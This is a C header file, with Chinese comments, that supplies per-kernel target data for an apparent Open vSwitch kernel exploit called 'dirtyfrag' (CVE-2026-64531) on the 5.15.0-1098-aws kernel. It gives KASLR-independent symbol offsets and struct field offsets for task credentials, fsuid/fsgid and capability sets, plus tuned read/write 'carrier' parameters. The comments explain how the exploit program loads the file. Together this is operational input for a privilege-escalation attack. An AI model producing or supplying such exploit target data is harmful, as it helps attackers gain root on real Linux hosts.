/*
 * target.h - dirtyfrag OVS (CVE-2026-64531) kernel offsets
 *
 * 放这里：offset/<N>系/<release>/target.h
 * 例：    offset/5系/5.8.0-59-generic/target.h
 *
 * 程序启动时按目录名找本机 release，不需要重新编译。
 * 本文件同时也是合法 C 头文件，可以直接 #include 静态编译。
 *
 * 生成: tools/mk_offset.py（记录集）
 */
#ifndef DIRTYFRAG_TARGET_H
#define DIRTYFRAG_TARGET_H

#define KREC_FORMAT        1
#define KREC_RELEASE       "5.15.0-1098-aws"
#define KREC_VERSION       ""
#define KREC_VERSION_HASH  3345637186UL
#define KREC_MACHINE       "x86_64"

/* 符号偏移：相对 _text，与 KASLR 无关 */
#define KREC_VMLINUX_MODULE_KTYPE 32023264UL
#define KREC_VMLINUX_INIT_PID_NS  32022688UL

/* 结构体字段偏移 */
#define KREC_NF_CONNTRACK_HELPER_ME    40
#define KREC_MODULE_KOBJ_KTYPE         120
#define KREC_TASK_PID                  2496
#define KREC_TASK_CRED                 2984
#define KREC_TASK_PID_LINKS            2608
#define KREC_CRED_FSUID                32
#define KREC_CRED_FSGID                36
#define KREC_CRED_CAP_PERMITTED        52
#define KREC_CRED_CAP_EFFECTIVE        60
#define KREC_PID_NAMESPACE_IDR         0
#define KREC_IDR_IDR_RT                0
#define KREC_IDR_BASE                  16
#define KREC_XARRAY_XA_HEAD            8
#define KREC_XA_NODE_SHIFT             0
#define KREC_XA_NODE_SLOTS             40
#define KREC_PID_TASKS                 16
#define KREC_HLIST_HEAD_FIRST          0
#define KREC_DST_ENTRY_REF             64
#define KREC_METADATA_DST_TUN_INFO     120
#define KREC_IP_TUNNEL_KEY_IPV4_SRC    8
#define KREC_IP_TUNNEL_KEY_IPV4_DST    12
#define KREC_IP_TUNNEL_KEY_TOS         42
#define KREC_IP_TUNNEL_KEY_TTL         43
#define KREC_IP_TUNNEL_KEY_TP_SRC      48
#define KREC_IP_TUNNEL_KEY_TP_DST      50
#define KREC_OVS_CT_LABELS             40
#define KREC_OVS_CT_ACTION_LEN         164

/* 行为参数：从调试信息推不出来，只能实机试 */
#define KREC_REF_KIND      "__refcnt"
#define KREC_TUNNEL_INFO   29
#define KREC_READ_CARRIER  "timeout"
#define KREC_WRITE_CARRIER "timeout"
#define KREC_READ_LANES    "tos,ttl,tp_src_0,tp_src_1,tp_dst_0,tp_dst_1,ipv4_src_0,ipv4_src_1,ipv4_src_2,ipv4_src_3,ipv4_dst_0,ipv4_dst_1,ipv4_dst_2,ipv4_dst_3"

#endif /* DIRTYFRAG_TARGET_H */
